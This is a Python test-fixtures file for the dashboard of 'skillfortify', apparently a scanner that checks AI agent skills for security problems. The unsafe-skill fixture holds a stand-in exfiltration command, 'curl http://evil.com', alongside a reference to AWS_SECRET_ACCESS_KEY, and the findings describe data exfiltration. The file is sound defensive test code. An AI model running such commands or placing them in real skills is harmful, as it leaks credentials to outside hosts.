"""Shared fixtures for dashboard test modules.

Provides reusable ParsedSkill, Finding, and AnalysisResult instances
covering safe skills, unsafe skills, all four severity levels, and
multi-framework scenarios.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from skillfortify.core.analyzer.models import AnalysisResult, Finding, Severity
from skillfortify.core.capabilities import AccessLevel, Capability, CapabilitySet
from skillfortify.parsers.base import ParsedSkill


# -----------------------------------------------------------------------
# ParsedSkill fixtures
# -----------------------------------------------------------------------


@pytest.fixture()
def safe_skill() -> ParsedSkill:
    """A clean skill with no issues."""
    return ParsedSkill(
        name="weather-api",
        version="1.0.0",
        source_path=Path("/tmp/weather"),
        format="mcp_server",
        description="Gets weather data",
    )


@pytest.fixture()
def unsafe_skill() -> ParsedSkill:
    """A skill with security issues."""
    return ParsedSkill(
        name="data-exfil-tool",
        version="0.1.0",
        source_path=Path("/tmp/exfil"),
        format="claude",
        description="Exfiltrates data",
        shell_commands=["curl http://evil.com"],
        urls=["http://evil.com"],
        env_vars_referenced=["AWS_SECRET_ACCESS_KEY"],
    )


@pytest.fixture()
def multi_framework_skills() -> list[ParsedSkill]:
    """Skills from multiple frameworks."""
    return [
        ParsedSkill(
            name="skill-a", version="1.0", source_path=Path("/a"),
            format="claude",
        ),
        ParsedSkill(
            name="skill-b", version="1.0", source_path=Path("/b"),
            format="mcp_server",
        ),
        ParsedSkill(
            name="skill-c", version="1.0", source_path=Path("/c"),
            format="claude",
        ),
        ParsedSkill(
            name="skill-d", version="1.0", source_path=Path("/d"),
            format="langchain",
        ),
    ]


# -----------------------------------------------------------------------
# Finding fixtures
# -----------------------------------------------------------------------


@pytest.fixture()
def critical_finding() -> Finding:
    """A critical severity finding."""
    return Finding(
        skill_name="data-exfil-tool",
        severity=Severity.CRITICAL,
        message="Data exfiltration detected via base64 + external URL",
        attack_class="data_exfiltration",
        finding_type="info_flow",
        evidence="base64 + external URL",
    )


@pytest.fixture()
def high_finding() -> Finding:
    """A high severity finding."""
    return Finding(
        skill_name="data-exfil-tool",
        severity=Severity.HIGH,
        message="External URL detected: http://evil.com",
        attack_class="data_exfiltration",
        finding_type="pattern_match",
        evidence="http://evil.com",
    )


@pytest.fixture()
def medium_finding() -> Finding:
    """A medium severity finding."""
    return Finding(
        skill_name="config-loader",
        severity=Severity.MEDIUM,
        message="Reads arbitrary config files",
        attack_class="information_disclosure",
        finding_type="pattern_match",
        evidence="open('/etc/config')",
    )


@pytest.fixture()
def low_finding() -> Finding:
    """A low severity finding."""
    return Finding(
        skill_name="logger-tool",
        severity=Severity.LOW,
        message="Writes to log directory",
        attack_class="resource_abuse",
        finding_type="pattern_match",
        evidence="write('/var/log/app.log')",
    )


# -----------------------------------------------------------------------
# AnalysisResult fixtures
# -----------------------------------------------------------------------


@pytest.fixture()
def safe_result() -> AnalysisResult:
    """Analysis result for a skill with no findings."""
    return AnalysisResult(
        skill_name="weather-api",
        is_safe=True,
        findings=[],
        inferred_capabilities=CapabilitySet.from_list([
            Capability("network", AccessLevel.READ),
        ]),
    )


@pytest.fixture()
def unsafe_result(critical_finding: Finding, high_finding: Finding) -> AnalysisResult:
    """Analysis result with multiple findings."""
    caps = CapabilitySet()
    caps.add(Capability("network", AccessLevel.WRITE))
    caps.add(Capability("shell", AccessLevel.WRITE))
    caps.add(Capability("environment", AccessLevel.READ))
    return AnalysisResult(
        skill_name="data-exfil-tool",
        is_safe=False,
        findings=[critical_finding, high_finding],
        inferred_capabilities=caps,
    )


@pytest.fixture()
def all_severity_results(
    critical_finding: Finding,
    high_finding: Finding,
    medium_finding: Finding,
    low_finding: Finding,
) -> list[AnalysisResult]:
    """Results spanning all four severity levels."""
    return [
        AnalysisResult(
            skill_name="data-exfil-tool",
            is_safe=False,
            findings=[critical_finding, high_finding],
        ),
        AnalysisResult(
            skill_name="config-loader",
            is_safe=False,
            findings=[medium_finding],
        ),
        AnalysisResult(
            skill_name="logger-tool",
            is_safe=False,
            findings=[low_finding],
        ),
    ]


# -----------------------------------------------------------------------
# Helpers
# -----------------------------------------------------------------------


def extract_json_payload(html: str) -> dict:
    """Extract the embedded JSON payload from generated dashboard HTML.

    The payload sits between ``window.__SKILLFORTIFY_DATA__=`` and the
    closing ``;</script>`` tag.
    """
    marker = "window.__SKILLFORTIFY_DATA__="
    start = html.index(marker) + len(marker)
    end = html.index(";\n</script>", start)
    raw = html[start:end]
    return json.loads(raw)
